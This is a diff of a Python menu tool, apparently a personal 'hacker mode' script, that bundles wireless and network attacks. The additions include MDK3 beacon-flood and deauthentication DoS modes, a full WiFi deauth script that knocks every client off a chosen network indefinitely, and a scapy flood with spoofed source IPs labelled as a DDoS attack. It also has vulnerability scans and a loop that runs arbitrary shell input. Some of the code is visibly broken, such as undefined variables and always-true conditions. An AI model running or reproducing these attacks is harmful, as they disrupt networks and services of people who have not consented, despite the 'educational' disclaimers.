@@ -1,139 +1,554 @@
 import subprocess
 import os
 import readline
+from randmac import RandMac
+import time
 import random
+from scapy.all import *
 
-# --------check what user needs and do it automatically
-def check_action(answer):
-    if answer == "1":
-        option = input("\n1: Change mac address\n"
-                       "2: Wireshark the magician\n"
+# SPOOFING APPS HERE---------------------------------
+def spoofing_menu():
+    option = input("\n1: MAC_address_changer_custom\n"
+                       "2: Wireshark\n"
                        "3: MDK3\n"
                        "4: PRISM-AP\n"
                        "9: Back\n"
                        "Choose: ")
-        if option == "1":
-            mac_address_list = ["FC:54:CC:27:2B:4A", "09:57:02:44:4F:81", "53:79:FC:2C:DB:95", "F3:17:51:63:BF:83",
-                                "7E:A7:48:34:8F:12", "E8:6C:34:77:0C:25", "FA:D1:57:FB:AC:7D", "CE:1C:4C:D0:D3:7B",
-                                "19:D3:49:48:51:67", "72:D8:9B:1F:A8:F6", "46:CE:E9:69:38:07", "92:E6:71:AB:7C:45",
-                                "0A:27:7F:07:3D:94", "77:2B:9D:40:76:C2", "C7:41:93:24:32:55", "C8:A0:3F:F2:64:21",
-                                "5E:2A:49:49:79:F6", "6E:4F:8E:5B:DB:B6", "82:07:F6:58:32:83", "51:F2:DA:5E:BD:CC",
-                                "13:86:CC:1E:09:87", "52:A8:F6:E4:30:61", "7D:E4:41:98:65:A8", "82:FC:1C:AB:D6:C8",
-                                "57:BF:64:71:28:DC", "F7:A3:81:61:41:88", "70:DA:D7:E4:F0:36", "87:E0:0F:A8:69:2E",
-                                "TS:69:BW:96:9D:69", "DF:65:AC:24:H3:20"]
-            new_mac = random.choice(mac_address_list)
-            subprocess.call("ifconfig wlan0 down", shell=True)
-            subprocess.call(["ifconfig", "wlan0", "hw", "ether", new_mac])
-            subprocess.call("ifconfig wlan0 up", shell=True)
-            print("[+] Changed Mac address successfully to", new_mac)
+    if option == "1":
+        #  MAC ADDRESS CHANGER
+        new_mac = RandMac()
+        subprocess.call("ifconfig wlan0 down", shell=True)
+        time.sleep(2)
+        subprocess.call(["ifconfig", "wlan0", "hw", "ether", new_mac])
+        time.sleep(2)
+        subprocess.call("ifconfig wlan0 up", shell=True)
+        time.sleep(2)
+        print("[+] Changed Mac address successfully to", new_mac)
 
-        if option == "2":
-            print("Starting WIRESHARK...")
-            subprocess.call("airmon-ng check kill", shell=True)
+    if option == "2":
+        # WIRESHARK
+        print("Starting WIRESHARK...")
+        subprocess.call("airmon-ng check kill", shell=True)
+        subprocess.call("airmon-ng start wlan0", shell=True)
+        print("Executing Commands...")
+        subprocess.call("tshark -i wlan0 > tshark_output.txt", shell=True)
+        subprocess.call("ifconfig wlan0 down", shell=True)
+        subprocess.call("iwconfig wlan0 mode managed", shell=True)
+        subprocess.call("ifconfig wlan0 up", shell=True)
+        subprocess.call("service NetworkManager restart", shell=True)
+        print("DONE...\n"
+              "results are stored at /Scripts/tshark_output.txt")
+    if option == "3":
+        # MDK3
+        option_2 = input("\nMDK3 has multiple options\n"
+                         "1: BEACON FLOOD MODE\n"
+                         "2: DEAUTHENTICATION / DISASSOCIATION AMOK MODE\n"
+                         "3: AUTHENTICATION DoS MODE\n"
+                         "9: Back\n"
+                         "CHOOSE: ")
+        if option_2 == "1":
             subprocess.call("airmon-ng start wlan0", shell=True)
-            print("Executing Commands...")
-            subprocess.call("tshark -i wlan0 > tshark_output.txt", shell=True)
-            subprocess.call("ifconfig wlan0 down", shell=True)
-            subprocess.call("iwconfig wlan0 mode managed", shell=True)
-            subprocess.call("ifconfig wlan0 up", shell=True)
+            print("Executing the commands...ending in 120 seconds")
+            subprocess.call("mdk3 mon0 b", shell=True, timeout=120)
+            subprocess.call("sudo", shell=True)
+            print("DONE...")
+        if option_2 == "2":
+            subprocess.call("airmon-ng start wlan0", shell=True)
+            print("executing commands...ending in 120 seconds")
+            subprocess.call("mdk3 mon0 d -c [1,2,3,4,5,6,7,8,9,10,11,12]", shell=True, timeout=120)
             subprocess.call("service NetworkManager restart", shell=True)
-            print("DONE...\n"
-                  "results are stored at /Scripts/tshark_output.txt")
-        if option == "3":
-            option_2 = input("\nMDK3 has multiple options\n"
-                             "1: BEACON FLOOD MODE\n"
-                             "2: DEAUTHENTICATION / DISASSOCIATION AMOK MODE\n"
-                             "3: AUTHENTICATION DoS MODE\n"
-                             "9: Back\n"
-                             "CHOOSE: ")
-            if option_2 == "1":
-                subprocess.call("airmon-ng start wlan0", shell=True)
-                print("Executing the commands...ending in 120 seconds")
-                subprocess.call("mdk3 mon0 b", shell=True, timeout=120)
-                subprocess.call("sudo", shell=True)
-                print("DONE...")
-            if option_2 == "2":
-                subprocess.call("airmon-ng start wlan0", shell=True)
-                print("executing commands...ending in 120 seconds")
-                subprocess.call("mdk3 mon0 d -c [1,2,3,4,5,6,7,8,9,10,11,12]", shell=True, timeout=120)
-                subprocess.call("service NetworkManager restart", shell=True)
-                print("DONE...")
-            if option_2 == "3":
-                subprocess.call("airmon-ng start wlan0", shell=True)
-                print("executing commands...ending in 120 seconds")
-                subprocess.call("mdk3 mon0 a", shell=True, timeout=120)
-                subprocess.call("service NetworkManager restart", shell=True)
-                print("DONE...")
-            if option_2 == "9":
-                return
-        if option == "4":
-            subprocess.call("prism-ap", shell=True)
-        if option == "9":
+            print("DONE...")
+        if option_2 == "3":
+            subprocess.call("airmon-ng start wlan0", shell=True)
+            print("executing commands...ending in 120 seconds")
+            subprocess.call("mdk3 mon0 a", shell=True, timeout=120)
+            subprocess.call("service NetworkManager restart", shell=True)
+            print("DONE...")
+        if option_2 == "9":
             return
+    if option == "4":
+        # PRISM-AP
+        subprocess.call("prism-ap", shell=True)
+    if option == "9":
+        return
 
+# WIRELESS ATTACKS HERE------------------------------
+def wireless_menu():
     if answer == "2":
         option = input("\nWhich of the following:\n"
-                       "1: WIFITE \n"
-                       "9: Back\n"
-                       "Choose: ")
+                        "1: WIFITE\n"
+                        "2: WIFI_DOS_OWN\n"
+                        "9: Back\n"
+                        "Choose: ")
         if option == "1":
-                print("STARTING PROCESS...")
-                subprocess.call("wifite --kill", shell=True)
-                print("DONE...")
+            # WIFITE
+            print("STARTING PROCESS...")
+            subprocess.call("wifite --kill", shell=True)
+            print("DONE...")
+
+        if option == "2":
+            # -----------------------------------------------------------------------------------------------------
+            # THIS SCRIPT WAS CREATED FROM DAVIDBOMBAL -> https://www.davidbombal.com
+            #                                          -> https://www.youtube.com/davidbombal   
+            #------------------------------------------------------------------------------------------------------
+            # Disclaimer: 
+            # This script is for educational purposes only.  
+            # Do not use against any network that you don't own or have authorization to test.
+
+            #!/usr/bin/python3 
+
+            # We will be using the csv module to work with the data captured by airodump-ng.
+            import csv
+            # If we move csv files to a backup directory we will use the datetime module to create
+            # to create a timestamp in the file name.
+            from datetime import datetime
+            # We will use the os module to get the current working directory and to list filenames in a directory.
+            import os
+            # We will use the regular expressions module to find wifi interface name, and also MAC Addresses.
+            import re
+            # We will use methods from the shutil module to move files.
+            import shutil
+            # We can use the subprocess module to run operating system commands.
+            import subprocess
+            # We will create a thread for each deauth sent to a MAC so that enough time doesn't elapse to allow a device back on the network. 
+            import threading
+            # We use the sleep method in the menu.
+            import time
+
+
+            # Helper functions
+            def in_sudo_mode():
+                """If the user doesn't run the program with super user privileges, don't allow them to continue."""
+                if not 'SUDO_UID' in os.environ.keys():
+                    print("Try running this program with sudo.")
+                    exit()
+
+
+            def find_nic():
+                """This function is used to find the network interface controllers on your computer."""
+                # We use the subprocess.run to run the "sudo iw dev" command we'd normally run to find the network interfaces. 
+                result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
+                network_interface_controllers = wlan_code.findall(result)
+                return network_interface_controllers
+
+
+            def set_monitor_mode(controller_name):
+                """This function needs the network interface controller name to put it into monitor mode.
+                Argument: Network Controller Name"""
+                # Put WiFi controller into monitor mode.
+                # This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
+                subprocess.run(["ip", "link", "set", wifi_name, "down"])
+                # Killing conflicting processes makes sure that nothing interferes with putting controller into monitor mode.
+                subprocess.run(["airmon-ng", "check", "kill"])
+                # Put the WiFi nic in monitor mode.
+                subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
+                # Bring the WiFi controller back online.
+                subprocess.run(["ip", "link", "set", wifi_name, "up"])
+
+            def set_band_to_monitor(choice):
+                """If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both."""
+                if choice == "0":
+                    # Bands b and g are 2.4Ghz WiFi Networks
+                    subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                elif choice == "1":
+                    # Band a is for 5Ghz WiFi Networks
+                    subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
+                else:
+                    # Will use bands a, b and g (actually band n). Checks full spectrum.
+                    subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+            def backup_csv():
+                """Move all .csv files in the directory to a new backup folder."""
+                for file_name in os.listdir():
+                    # We should only have one csv file as we delete them from the folder every time we run the program.
+                    if ".csv" in file_name:
+                        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
+                        # We get the current working directory.
+                        directory = os.getcwd()
+                        try:
+                            # We make a new directory called /backup
+                            os.mkdir(directory + "/backup/")
+                        except:
+                            print("Backup folder exists.")
+                        # Create a timestamp
+                        timestamp = datetime.now()
+                        # We copy any .csv files in the folder to the backup folder.
+                        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
+
+
+            def check_for_essid(essid, lst):
+                """Will check if there is an ESSID in the list and then send False to end the loop."""
+                check_status = True
+
+                # If no ESSIDs in list add the row
+                if len(lst) == 0:
+                    return check_status
+
+                # This will only run if there are wireless access points in the list.
+                for item in lst:
+                    # If True don't add to list. False will add it to list
+                    if essid in item["ESSID"]:
+                        check_status = False
+
+                return check_status
+
+
+            def wifi_networks_menu():
+                """ Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c."""
+                active_wireless_networks = list()
+                try:
+                    while True:
+                        # We want to clear the screen before we print the network interfaces.
+                        subprocess.call("clear", shell=True)
+                        for file_name in os.listdir():
+                                # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
+                                # The following list contains the field names for the csv entries.
+                                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
+                                if ".csv" in file_name:
+                                    with open(file_name) as csv_h:
+                                        # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
+                                        # This creates a list of dictionaries with the keys as specified in the fieldnames.
+                                        csv_h.seek(0)
+                                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                                        for row in csv_reader:
+                                            if row["BSSID"] == "BSSID":
+                                                pass
+                                            elif row["BSSID"] == "Station MAC":
+                                                break
+                                            elif check_for_essid(row["ESSID"], active_wireless_networks):
+                                                active_wireless_networks.append(row)
+
+                        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
+                        print("No |\tBSSID              |\tChannel|\tESSID                         |")
+                        print("___|\t___________________|\t_______|\t______________________________|")
+                        for index, item in enumerate(active_wireless_networks):
+                            # We're using the print statement with an f-string. 
+                            # F-strings are a more intuitive way to include variables when printing strings, 
+                            # rather than ugly concatenations.
+                            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
+                        # We make the script sleep for 1 second before loading the updated list.
+                        time.sleep(1)
+
+                except KeyboardInterrupt:
+                    print("\nReady to make choice.")
+                
+                # Ensure that the input choice is valid.
+                while True:
+                    net_choice = input("Please select a choice from above: ")
+                    if active_wireless_networks[int(net_choice)]:
+                        return active_wireless_networks[int(net_choice)]
+                    print("Please try again.")
+
+
+
+            def set_into_managed_mode(wifi_name):
+                """SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
+                   ARGUMENTS: wifi interface name 
+                """
+                # Put WiFi controller into monitor mode.
+                # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
+                subprocess.run(["ip", "link", "set", wifi_name, "down"])
+                # Put the WiFi nic in monitor mode.
+                subprocess.run(["iwconfig", wifi_name, "mode", "managed"])
+                subprocess.run(["ip", "link", "set", wifi_name, "up"])
+                subprocess.run(["service", "NetworkManager", "start"])
+
+
+            def get_clients(hackbssid, hackchannel, wifi_name):
+                subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+            def deauth_attack(network_mac, target_mac, interface):
+                # We are using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet.
+                # Then we also need to specify the interface
+                subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])
+
+
+            # Regular Expressions to be used.
+            mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
+            wlan_code = re.compile("Interface (wlan[0-9]+)")
+
+            # Program Header
+            # Basic user interface header
+            print(r"""______            _     _  ______                 _           _ 
+            |  _  \          (_)   | | | ___ \               | |         | |
+            | | | |__ ___   ___  __| | | |_/ / ___  _ __ ___ | |__   __ _| |
+            | | | / _` \ \ / / |/ _` | | ___ \/ _ \| '_ ` _ \| '_ \ / _` | |
+            | |/ / (_| |\ V /| | (_| | | |_/ / (_) | | | | | | |_) | (_| | |
+            |___/ \__,_| \_/ |_|\__,_| \____/ \___/|_| |_| |_|_.__/ \__,_|_|""")
+            print("\n****************************************************************")
+            print("\n* Copyright of David Bombal, 2021                              *")
+            print("\n* https://www.davidbombal.com                                  *")
+            print("\n* https://www.youtube.com/davidbombal                          *")
+            print("\n****************************************************************")
+
+            # In Sudo Mode?
+            in_sudo_mode()
+            # Move any csv files to current working directory/backup
+            backup_csv()
+
+            # Lists to be populated
+            macs_not_to_kick_off = list()
+
+
+            # Menu to request Mac Addresses to be kept on network.
+            while True:
+                print("Please enter the MAC Address(es) of the device(s) you don't want to kick off the network.")
+                macs = input("Please use a comma separated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 :")
+                # Use the MAC Address Regex to find all the MAC Addresses entered in the above input.
+                macs_not_to_kick_off = mac_address_regex.findall(macs)
+                # We reassign all the MAC address to the same variable as a list and make them uppercase using a list comprehension.
+                macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
+                # If you entered a valid MAC Address the program flow will continue and break out of the while loop.
+                if len(macs_not_to_kick_off) > 0:
+                    break
+                
+                print("You didn't enter valid Mac Addresses.")
+
+
+            # Menu to ask which bands to scan with airmon-ng
+            while True:
+                wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
+                print("Please select the type of scan you want to run.")
+                for index, controller in enumerate(wifi_controller_bands):
+                    print(f"{index} - {controller}")
+                
+
+                # Check if the choice exists. If it doesn't it asks the user to try again.
+                # We don't cast it to an integer at this stage as characters other than digits will cause the program to break.
+                band_choice = input("Please select the bands you want to scan from the list above: ")
+                try:
+                    if wifi_controller_bands[int(band_choice)]:
+                        # Since the choice exists and is an integer we can cast band choice as an integer.
+                        band_choice = int(band_choice)
+                        break
+                except:
+                    print("Please make a valid selection.")
+
+
+            # Find all the network interface controllers.
+            network_controllers = find_nic()
+            if len(network_controllers) == 0:
+                # If no networks interface controllers connected to your computer the program will exit.
+                print("Please connect a network interface controller and try again!")
+                exit()
+
+
+            # Select the network interface controller you want to put into monitor mode.
+            while True:
+                for index, controller in enumerate(network_controllers):
+                    print(f"{index} - {controller}")
+                
+                controller_choice = input("Please select the controller you want to put into monitor mode: ")
+
+                try:
+                    if network_controllers[int(controller_choice)]:
+                        break
+                except:
+                    print("Please make a valid selection!")
+
+
+            # Assign the network interface controller name to a variable for easy use.
+            wifi_name = network_controllers[int(controller_choice)]
+
+
+            # Set network interface controller to monitor mode.
+            set_monitor_mode(wifi_name)
+            # Monitor the selected wifi band(s).
+            set_band_to_monitor(band_choice)
+            # Print WiFi Menu
+            wifi_network_choice = wifi_networks_menu()
+            hackbssid = wifi_network_choice["BSSID"]
+            # We strip out all the extra white space to just get the channel.
+            hackchannel = wifi_network_choice["channel"].strip()
+            # backup_csv()
+            # Run against only the network we want to kick clients off.
+            get_clients(hackbssid, hackchannel, wifi_name)
+
+            # We define a set, because it can only hold unique values.
+            active_clients = set()
+            # We would like to know the threads we've already started so that we don't start multiple threads running the same deauth.
+            threads_started = []
+
+            # Make sure that airmon-ng is running on the correct channel.
+            subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
+            try:
+                while True:
+                    count = 0
+
+                    # We want to clear the screen before we print the network interfaces.
+                    subprocess.call("clear", shell=True)
+                    for file_name in os.listdir():
+                        # We should only have one csv file as we backup all previous csv files from the folder every time we run the program. 
+                        # The following list contains the field names for the csv entries.
+                        fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
+                        if ".csv" in file_name and file_name.startswith("clients"):
+                            with open(file_name) as csv_h:
+                                print("Running")
+                                # We use the DictReader method and tell it to take the csv_h contents and then apply the dictionary with the fieldnames we specified above. 
+                                # This creates a list of dictionaries with the keys as specified in the fieldnames.
+                                csv_h.seek(0)
+                                csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                                for index, row in enumerate(csv_reader):
+                                    if index < 5:
+                                        pass
+                                    # We will not add the MAC Addresses we specified at the beginning of the program to the ones we will kick off.
+                                    elif row["Station MAC"] in macs_not_to_kick_off:
+                                        pass
+                                    else:
+                                    # Add all the active MAC Addresses.
+                                        active_clients.add(row["Station MAC"])
+                        
+                        print("Station MAC           |")
+                        print("______________________|")
+                        for item in active_clients:
+                            # We're using the print statement with an f-string. 
+                            # F-strings are a more intuitive way to include variables when printing strings, 
+                            # rather than ugly concatenations.
+                            print(f"{item}")
+                            # Once a device is in the active clients set and not one of the threads running deauth attacks we start a new thread as a deauth attack.
+                            if item not in threads_started:
+                                # It's easier to work with the unique MAC Addresses in a list and add the MAC to the list of threads we started before we start running the deauth thread.
+                                threads_started.append(item)
+                                # We run the deauth_attack function in the thread with the argumenets hackbssid, item and wifi_name, we also specify it as a background daemon thread.
+                                # A daemon thread keeps running until the main thread stops. You can stop the main thread with ctrl + c.
+                                t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
+                                t.start()
+            except KeyboardInterrupt:
+                print("\nStopping Deauth")
+
+            # Set the network interface controller back into managed mode and restart network services. 
+            set_into_managed_mode(wifi_name)
         if option == "9":
             return
 
-    if answer == "3":
-        option = input("\n1: NMAP\n"
+# GATHER_INFO APPS HERE------------------------------
+def gather_info_menu():
+    option = input("\n1: NMAP\n"
                        "2: Net-Discovery\n"
-                       "3: WEBSITE/IP analyze"
+                       "3: WEB_ANALYZER\n"
                        "9: Back\n"
                        "Choose: ")
-        if option == "1":
-            print("\nNMAP has multiple options")
-            option_2 = input("1: Stealth Scan\n"
-                             "2: Aggressive Scan\n"
-                             "3: Scan With Decoys\n"
-                             "9: Back\n"
-                             "Choose:  ")
-            if option_2 == "1":
-                print("Executing commands...")
-                subprocess.call("nmap -sS 192.168.1.*", shell=True)
-            if option_2 == "2":
-                print("Executing commands...")
-                subprocess.call("nmap -T3 192.168.1.*", shell=True)
-            if option_2 == "3":
-                print("Executing commands...")
-                subprocess.call("nmap -D 192.168.0.1,192.168.0.2 192.168.1.*", shell=True)
-            if option_2 == "9":
-                return
-        if option == "2":
-            subprocess.call("netdiscover -i wlan0", shell=True, timeout=30)
-        if option == "3":
-            # FUNCTION THAT CHECKS IF THE IP/WEB IS UP NOW
-            web_name = input("Type the Webserver's link or IP: ")
-            web_option = input("\nAVAILABLE OPTIONS:\n"
-                               "1: Check for open ports\n"
-                               "2: DDOS attack\n"
-                               "3: Gather General Information\n"
-                               "4: Retype IP/WEB address"
-                               "9: BACK\n"
-                               "Choose: ")
+    if option == "1":
+        print("\n*NMAP* has multiple options")
+        option_2 = input("1: Stealth Scan\n"
+                         "2: Aggressive Scan\n"
+                         "3: Scan With Decoys\n"
+                         "9: Back\n"
+                         "Choose:  ")
+        if option_2 == "1":
+            print("Executing commands...")
+            subprocess.call("nmap -sS 192.168.1.*", shell=True)
+        if option_2 == "2":
+            print("Executing commands...")
+            subprocess.call("nmap -T3 192.168.1.*", shell=True)
+        if option_2 == "3":
+            print("Executing commands...")
+            subprocess.call("nmap -D 192.168.0.1,192.168.0.2 192.168.1.*", shell=True)
+        if option_2 == "9":
+            return
+    if option == "2":
+        subprocess.call("netdiscover -i wlan0", shell=True, timeout=30)
+    if option == "3":
+        def option_checker(web_option):
             if web_option == "1":
-                return
+                port_scanner()
             if web_option == "2":
-                return
+                DDOS_attack()
             if web_option == "3":
-                return
+                valnerability_scanner()
+            if web_option == "4":
+                nikto_scanner()
             if web_option == "9":
                 return
 
+        # OPEN PORT SCANNER
+        def port_scanner():
+            target = input("Scan the whole network for open ports or a single HOST?[1 or 2]: ")
+            if target == "1":
+                subprocess.call("nmap 192.168.1.1/24", shell=True)
+                extra = input("Want to take it a step forward to find vulnerabilities?[Y/N]: ")
+                if extra == "Y" or "y":
+                    subprocess.call("nmap -Pn --script vuln 192.168.1.1/24", shell=True)
+                else:
+                    return
+            if target == "2":
+                host = input("Type the address here: ")
+                subprocess.call("nmap"+ host, shell=True)
+                extra = input("Want to take it a step forward to find vulnerabilities?[Y/N]: ")
+                if extra == "Y" or "y":
+                    subprocess.call("nmap -Pn --script vuln"+ host, shell=True)
+                else:
+                    return
+            
+        # DDOS ATTACK - (MULTIPLE IP'S MULTIPLE PORTS)
+        def DDOS_attack():
+            target_IP = input("Enter IP address of Target: ")
+            i = 1
+            while True:
+               a = str(random.randint(1,254))
+               b = str(random.randint(1,254))
+               c = str(random.randint(1,254))
+               d = str(random.randint(1,254))
+               dot = "."
+               Source_ip = a + dot + b + dot + c + dot + d
+               
+               for source_port in range(1, 65535):
+                  IP1 = IP(source_IP = source_IP, destination = target_IP)
+                  TCP1 = TCP(srcport = source_port, dstport = 80)
+                  pkt = IP1 / TCP1
+                  send(pkt,inter = .001)
+                  
+                  print ("packet sent ", i)
+                  i = i + 1
+
+        # VULNERABILITY SCANNER
+        def valnerability_scanner():
+            vuln_target = input("Type the target IP/WEB address here: ")
+            subprocess.call("nmap --script nmap-vulners,vulscan -sV" + vuln_target, shell=True)
+
+        # NIKTO SCANNER
+        def nikto_scanner():
+            server_address = input("Type the WEB SERVER you want to test: ")
+            save_file = input("Save file for later?[Y/N]: ")
+            if save_file == "yes" or "YES":
+                subprocess.call("perl nikto.pl -h"+ server_address + "-o scan.htm", shell=True)
+            else:
+                subprocess.call("perl nikto.pl -h" + server_address)
+
+        #-------------------MAIN MENU OF WEB_ANALYZER------------------
+        print("Welcome to the main menu of WEB_ANALYZER\n"
+              "rember to not do any harm to equipment you don't own, as this project/scripts are made for educational purposes.\n\n")
+        web_option = input("\nAVAILABLE OPTIONS:\n"
+                           "1: Check for open ports\n"
+                           "2: DDOS attack\n"
+                           "3: vulnerability scanner"
+                           "4: NIKTO WEBSITE scanner"
+                           "9: BACK\n"
+                           "Choose: ")
+        option_checker(web_option)
+
+# CUSTOM COMMAND HERE--------------------------------
+def custom_command():
+    # FOR FUTURE UPDATE ADD MULTIPLE CUSTOM COMMANDS AT ONCE
+    print("---------CUSTOM COMMANDS---------")
+    move = "yes"
+    while move != "":
+        move = input("Enter: ")
+        subprocess.call(move, shell=True)
+        
+# --------check what user needs and do it automatically
+def check_action(answer):
+    if answer == "1":
+        spoofing_menu()
+    if answer == "2":
+        wireless_menu()
+    if answer == "3":
+        gather_info_menu()
     if answer == "99":
-        print("---------CUSTOM COMMANDS---------")
-        cc = "yes"
-        while cc != "":
-            cc = input("Enter: ")
-            subprocess.call(cc, shell=True)
+        custom_command()
+        
 
 # ---------------------------------LIST OF POSSIBLE HACKS AND APP LOOP-------------------------------------------
 list_of_possible_hacks = ("\n1: SPOOFING\n"
@@ -143,7 +558,7 @@ list_of_possible_hacks = ("\n1: SPOOFING\n"
                           "(STOP = '')")
 print("------------HACKER MODE-----------")
 print("\nRemember to never do any harm and use that for educational purposes... or not at all just leave it here.\n"
-      "Anyway don't blame the developer for your bullshit, this whole project is only a proof of concept.\n")
+      "Anyway don't blame any developer of the scripts for your bullshit, this whole project is only a proof of concept and for educational purposes.\n")
 print("-----WHAT DO YOU WANT TO TEST-----")
 done = False
 while not done:
